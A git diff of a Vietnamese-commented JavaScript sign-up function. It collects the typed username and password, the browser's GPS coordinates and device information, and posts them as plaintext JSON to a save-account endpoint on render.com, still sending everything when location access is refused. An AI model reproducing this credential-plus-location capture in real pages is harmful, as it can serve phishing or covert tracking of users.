@@ -1,60 +1,47 @@
 function dangKy() {
-    // Kiểm tra xem trình duyệt có hỗ trợ định vị không
+    // Lấy thông tin trình duyệt từ file check_browser.js
+    const thongTinMay = layThongTinMay(); 
+
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
-            
-            // SỬA LẠI ID CHO ĐÚNG VỚI HTML (username, password)
             const usernameInput = document.getElementById('username'); 
             const passwordInput = document.getElementById('password');
 
-            // Đề phòng trường hợp không tìm thấy thẻ input thì return luôn để tránh lỗi
-            if (!usernameInput || !passwordInput) {
-                console.error("Không tìm thấy ô nhập liệu!");
-                return;
-            }
+            if (!usernameInput || !passwordInput) return;
 
             const data = {
                 username: usernameInput.value,
                 password: passwordInput.value,
-                // Lấy tọa độ
-                location: position.coords.latitude + "," + position.coords.longitude 
+                location: position.coords.latitude + "," + position.coords.longitude,
+                device_info: thongTinMay // GOM CHUNG VÀO ĐÂY!
             };
             
-            // Log ra xem thử dữ liệu trước khi gửi (F12 để xem)
-            console.log("Dữ liệu chuẩn bị gửi:", data);
-
-            // Gửi dữ liệu về server
-            fetch('https://cua-og.render.com/api/save-account', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                if(response.ok) console.log("Gửi thành công!");
-                else console.log("Gửi thất bại!");
-            })
-            .catch(error => console.error("Lỗi mạng:", error));
+            guiDuLieu(data);
         }, function(error) {
-            // Xử lý nếu người dùng bấm "Block" (Chặn) không cho lấy vị trí
-            console.warn("Người dùng không cho lấy vị trí hoặc lỗi GPS:", error);
-            // Vẫn cho đăng ký nhưng location để trống hoặc ghi chú
-            dangKyKhongViTri(); 
+            dangKyKhongViTri(thongTinMay); 
         });
     } else {
-        console.log("Trình duyệt không hỗ trợ Geolocation.");
+        dangKyKhongViTri(thongTinMay);
     }
 }
 
-// Hàm phụ: Đăng ký khi không lấy được vị trí (Optional)
-function dangKyKhongViTri() {
-    const data = {
-        username: document.getElementById('username').value,
-        password: document.getElementById('password').value,
-        location: "Không cho phép / Không xác định"
-    };
+// Hàm gửi chung để đỡ phải viết đi viết lại
+function guiDuLieu(data) {
     fetch('https://cua-og.render.com/api/save-account', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
-    });
+    })
+    .then(response => response.ok ? console.log("Ngon lành!") : console.log("Lỗi rồi og ơi"))
+    .catch(err => console.error("Lỗi mạng:", err));
+}
+
+function dangKyKhongViTri(thongTinMay) {
+    const data = {
+        username: document.getElementById('username').value,
+        password: document.getElementById('password').value,
+        location: "Không cho phép",
+        device_info: thongTinMay
+    };
+    guiDuLieu(data);
 }
